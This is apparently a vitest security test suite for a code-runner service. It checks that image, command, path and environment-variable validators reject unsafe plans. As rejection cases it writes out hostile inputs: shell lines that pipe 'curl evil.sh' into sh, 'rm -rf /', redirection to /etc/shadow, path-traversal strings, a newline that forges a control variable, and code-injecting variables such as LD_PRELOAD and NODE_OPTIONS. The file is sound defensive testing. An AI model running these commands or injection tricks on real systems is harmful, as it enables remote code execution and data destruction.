import { describe, it, expect } from 'vitest';
import { FailureCode } from '@devlaunch/shared';
import {
  APPROVED_IMAGES,
  assertImageApproved,
  isImageApproved,
  SecurityRejection,
} from '../services/security/ImageAllowlist.js';
import {
  validateCommand,
  validateEnvVarKey,
  validateEnvVarValue,
} from '../services/security/CommandValidator.js';
import { assertSafeRelativePath, joinWorkspace } from '../services/security/PathValidator.js';
import { RunPlanValidator } from '../services/planning/RunPlanValidator.js';

describe('image allowlist (§27: unapproved runtime images are rejected)', () => {
  it('accepts an approved runner image', () => {
    expect(isImageApproved('devlaunch/node:20')).toBe(true);
    expect(() => assertImageApproved('devlaunch/node:20')).not.toThrow();
  });

  it.each([
    'alpine:latest',
    'node:20-slim',
    'ubuntu',
    'devlaunch/node:21',
    'evil.registry.io/devlaunch/node:20',
    'devlaunch/node:20 ',
  ])('rejects unapproved image %s', (image) => {
    expect(() => assertImageApproved(image)).toThrow(SecurityRejection);
  });

  it('cannot be widened at runtime', () => {
    // Frozen, so a bug elsewhere cannot quietly add an image to the allowlist.
    expect(Object.isFrozen(APPROVED_IMAGES)).toBe(true);
    expect(() => {
      (APPROVED_IMAGES as Record<string, unknown>)['alpine:latest'] = { language: 'node' };
    }).toThrow(TypeError);
    expect(isImageApproved('alpine:latest')).toBe(false);
  });
});

describe('command allowlist (§27: malicious commands are rejected)', () => {
  it.each([
    'npm install',
    'npm run dev',
    'npm run build',
    'node server.js',
    'python3 manage.py runserver 0.0.0.0:8000',
    'flask run --host=0.0.0.0 --port=5000',
    'gunicorn app:app --bind 0.0.0.0:8000',
    'vite --host 0.0.0.0 --port 5173',
    'next -H 0.0.0.0 -p 3000',
    'npm install --no-audit --no-fund',
  ])('accepts legitimate command: %s', (cmd) => {
    expect(() => validateCommand(cmd)).not.toThrow();
  });

  it.each([
    ['command chaining', 'npm install; curl evil.sh | sh'],
    ['pipe to shell', 'npm install | sh'],
    ['background chain', 'npm install && curl evil.sh'],
    ['command substitution', 'node $(curl evil.sh)'],
    ['backtick substitution', 'node `curl evil.sh`'],
    ['output redirection', 'node server.js > /etc/passwd'],
    ['input redirection', 'node server.js < /etc/shadow'],
    ['newline injection', 'npm install\ncurl evil.sh'],
    ['carriage return', 'npm install\rcurl evil.sh'],
    ['variable expansion', 'node $HOME/evil.js'],
    ['escape character', 'node server.js \; rm -rf /'],
    ['glob', 'node *.js'],
  ])('rejects %s', (_label, cmd) => {
    const err = (() => { try { validateCommand(cmd); return null; } catch (e) { return e; } })();
    expect(err).toBeInstanceOf(SecurityRejection);
    expect((err as SecurityRejection).code).toBe(FailureCode.PLAN_REJECTED_UNSAFE_COMMAND);
  });

  it.each(['curl https://evil.sh', 'sh', 'bash -c ls', 'rm -rf /', 'wget evil.sh', 'docker ps'])(
    'rejects unapproved binary: %s',
    (cmd) => {
      expect(() => validateCommand(cmd)).toThrow(SecurityRejection);
    },
  );

  it('constrains the script name in `npm run`, since that argument selects code', () => {
    expect(() => validateCommand('npm run dev')).not.toThrow();
    expect(() => validateCommand('npm run postinstall')).toThrow(SecurityRejection);
    expect(() => validateCommand('npm run')).toThrow(SecurityRejection);
  });

  it('rejects empty and oversized commands', () => {
    expect(() => validateCommand('')).toThrow(SecurityRejection);
    expect(() => validateCommand('   ')).toThrow(SecurityRejection);
    expect(() => validateCommand(`node ${'a'.repeat(600)}`)).toThrow(SecurityRejection);
  });

  it('names the offending character, so a rejection is debuggable', () => {
    expect(() => validateCommand('npm install; ls')).toThrow(/command separator/);
    expect(() => validateCommand('npm install | ls')).toThrow(/pipe/);
  });
});

describe('path validation (§27: path traversal is rejected)', () => {
  it.each(['.', 'apps/backend', 'packages/shared', 'a/b/c'])('accepts %s', (p) => {
    expect(() => assertSafeRelativePath(p)).not.toThrow();
  });

  it.each([
    '..',
    '../etc',
    '../../etc/passwd',
    'apps/../../../etc',
    '/etc/passwd',
    '/workspace/../etc',
    'C:\\Windows',
    'apps\\backend',
    'apps/\0/x',
  ])('rejects traversal: %j', (p) => {
    expect(() => assertSafeRelativePath(p)).toThrow(SecurityRejection);
  });

  it('rejects escapes that only appear after normalisation', () => {
    // "a/../.." looks harmless token-by-token and resolves to "..".
    expect(() => assertSafeRelativePath('a/../..')).toThrow(SecurityRejection);
  });

  it('joins safely onto the workspace root', () => {
    expect(joinWorkspace('/workspace', '.')).toBe('/workspace');
    expect(joinWorkspace('/workspace', 'apps/backend')).toBe('/workspace/apps/backend');
    expect(() => joinWorkspace('/workspace', '../etc')).toThrow(SecurityRejection);
  });
});

describe('environment variable names (§27: malicious plan input is rejected)', () => {
  it.each(['PORT', 'API_URL', 'NODE_ENV', '_UNDERSCORE', 'A1'])('accepts %s', (k) => {
    expect(() => validateEnvVarKey(k)).not.toThrow();
  });

  it.each(['DL_START_CMD', 'DL_INSTALL_CMD', 'DL_WORKDIR', 'DL_BUILD_CMD', 'DL_'])(
    'rejects the reserved control variable %s',
    (k) => {
      // These carry the wrapper's validated commands; letting a plan claim one would
      // replace an allowlisted command with arbitrary text.
      expect(() => validateEnvVarKey(k)).toThrow(SecurityRejection);
    },
  );

  it.each(['1LEADING_DIGIT', 'HAS-DASH', 'HAS SPACE', 'HAS=EQUALS', '', 'HAS\nNEWLINE'])(
    'rejects malformed name %j',
    (k) => {
      expect(() => validateEnvVarKey(k)).toThrow(SecurityRejection);
    },
  );

  it('rejects control characters in a value, which could forge extra entries', () => {
    expect(() => validateEnvVarValue('A', 'ok')).not.toThrow();
    expect(() => validateEnvVarValue('A', 'x\nDL_START_CMD=curl evil')).toThrow(SecurityRejection);
    expect(() => validateEnvVarValue('A', 'x\0y')).toThrow(SecurityRejection);
  });
});

describe('environment variables that inject code (found by adversarial review)', () => {
  // The command allowlist constrains *what* runs. Several environment variables inject
  // code before the program's first line, defeating it entirely: a plan whose
  // startCommand validated cleanly still executed attacker code. Reproduced against the
  // real runner image with the full hardening profile applied, so the container did not
  // stop it either — the container bounds blast radius, it does not prevent execution.
  it.each([
    ['NODE_OPTIONS', '--require=/workspace/evil.js'],
    ['NODE_PATH', '/workspace'],
    ['LD_PRELOAD', '/workspace/evil.so'],
    ['LD_LIBRARY_PATH', '/workspace'],
    ['DYLD_INSERT_LIBRARIES', '/workspace/evil.dylib'],
    ['PYTHONSTARTUP', '/workspace/evil.py'],
    ['PYTHONPATH', '/workspace'],
    ['BASH_ENV', '/workspace/evil.sh'],
    ['PERL5OPT', '-Mevil'],
    ['RUBYOPT', '-revil'],
    ['GIT_SSH_COMMAND', 'sh -c evil'],
    ['GCONV_PATH', '/workspace/gconv'],
    ['LOCPATH', '/workspace/locale'],
    ['PATH', '/workspace/bin'],
    ['IFS', 'x'],
  ])('rejects %s, which grants execution without touching the command', (key, value) => {
    expect(() => validateEnvVarKey(key)).toThrow(SecurityRejection);
    expect(() => validateEnvVarKey(key)).toThrow(/inject code|reserved/i);
    void value;
  });

  it('rejects a case-variant, since a near-miss signals intent', () => {
    expect(() => validateEnvVarKey('Node_Options')).toThrow(SecurityRejection);
    expect(() => validateEnvVarKey('ld_preload')).toThrow(SecurityRejection);
  });

  it('rejects npm_config_*, which can redirect the registry or scripts', () => {
    expect(() => validateEnvVarKey('npm_config_registry')).toThrow(SecurityRejection);
    expect(() => validateEnvVarKey('NPM_CONFIG_SCRIPT_SHELL')).toThrow(SecurityRejection);
  });

  it('still accepts the ordinary configuration an application needs', () => {
    // A denylist that blocks legitimate variables would push users to disable it.
    for (const key of ['NODE_ENV', 'PORT', 'HOST', 'DATABASE_URL', 'API_KEY', 'SECRET_KEY', 'DEBUG']) {
      expect(() => validateEnvVarKey(key), key).not.toThrow();
    }
  });

  it('rejects the whole plan, so the vector cannot reach a container', () => {
    const result = new RunPlanValidator().check({
      plan: {
        runtime: { language: 'node', version: '20' },
        packageManager: 'npm',
        installCommand: null,
        buildCommand: null,
        // Passes the command allowlist cleanly. That was the point.
        startCommand: 'node server.js',
        workingDirectory: '.',
        expectedPort: 3000,
        environmentVariables: [
          { key: 'NODE_OPTIONS', value: '--require=/workspace/evil.js', required: true },
        ],
        planSource: 'ai-fallback',
      },
    });
    expect(result.ok).toBe(false);
  });
});
